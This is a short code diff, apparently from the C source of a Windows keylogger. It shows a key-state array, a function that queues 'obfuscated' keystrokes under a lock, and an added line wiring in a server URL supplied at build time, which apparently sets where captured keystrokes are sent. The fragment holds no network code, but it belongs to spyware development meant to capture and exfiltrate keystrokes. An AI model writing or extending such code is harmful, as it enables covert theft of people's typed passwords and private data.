@@ -14,6 +14,9 @@ CRITICAL_SECTION queueLock;
 #define KEY_COUNT 256
 BYTE keyStates[KEY_COUNT];
 
+// Use the server URL provided by CMake
+const char* serverUrl = SERVER_URL;
+
 
 void enqueueKeystroke(const char* obfuscatedKeystroke) {
     EnterCriticalSection(&queueLock);
